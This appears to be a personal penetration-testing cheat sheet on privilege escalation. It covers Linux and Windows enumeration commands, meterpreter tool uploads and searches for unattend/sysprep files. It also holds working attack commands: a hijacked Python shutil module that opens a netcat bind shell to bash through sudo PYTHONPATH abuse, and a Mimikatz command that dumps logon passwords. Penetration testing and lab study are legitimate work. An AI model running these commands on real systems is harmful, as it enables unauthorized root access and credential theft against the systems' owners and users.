# Priv Esc

* [windows-privesc check](https://github.com/pentestmonkey/windows-privesc-check)
* [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
 
See https://github.com/diego-treitos/linux-smart-enumeration.

## Copying files to the target

```
python -m SimpleHTTPServer 8080
```

## Hijack root python scripts

```
$ cat shutil.py 
import os
os.system("nc -lvp 9001 -e /bin/bash")
$ sudo -E PYTHONPATH=$(pwd) script-you-can-run-that-imports-shutil.py
$ echo 'whoami' | nc localhost 9001
```

## lxd group rootage

See https://www.hackingarticles.in/lxd-privilege-escalation/.

## Compiling binaries when compiler tools aren't available

```
sudo gcc -Wall -o jj jj.c -march=i686 -m32 -Wl,--hash-style=both
```

```
sudo apt-get install gcc-multilib g++-multilib
sudo apt install g++-i686-linux-gnu
sudo apt install gcc-mingw-w64-i686
sudo apt install mingw-w64-i686-dev
```

* See https://opensource.com/article/19/7/cross-compiling-gcc.
* See https://github.com/dockcross/dockcross.

## Windows

* `whoami`
* `net user username`
* `net user`
* `net localgroup Administrators`
* `hostname`
* `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
* `tasklist /SVC`
* `ipconfig /all`
* `route print`
* `netstat -ano`
* `netsh advfirewall show currentprofile`
* `netsh advfirewall firewall show rule name=all`
* `schtasks /query /fo LIST /v` (`schtasks /query /fo LIST /v | findstr TaskName | findstr /V \Microsoft\`)
* `wmic product get name, version, vendor`
* `wmic qfe get /all`
* (meterpreter) `upload /home/kali/tools/sysinternals/accesschk.exe C:\\PATH\\accesschk.exe`
* `accesschk.exe -uws "Everyone" "C:\Program Files"` (`accesschk -accepteula`), or use:
* (PS) `Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?($_.AccessToString -match "Everyone\sAllow\s\sModify")`
* `mountvol`
* (PS) `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path`
* (PS) `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*searchterm*"}` (for specific details on a driver)
* `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
* `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
* `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
* `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
* (meterpreter) `upload /home/kali/tools/windows-privesc-check2.exe C:\\PATH\\windows-privesc-check2.exe`
* `windows-privesc-check2.exe --dump -G`
* (PS) `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}` (`powershell -c "Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.PathName -like '*Program Files*'}"`)
* `icacls "C:\Program Files\some.exe"`
* `wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """` (all services with unquoted paths)
* `dir unattend.xml /s` `dir sysprep.xml /s` `dir sysprep.ini /s`
```
whoami /all
```

* See http://www.fuzzysecurity.com/tutorials/16.html

### Mimikatz

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
```
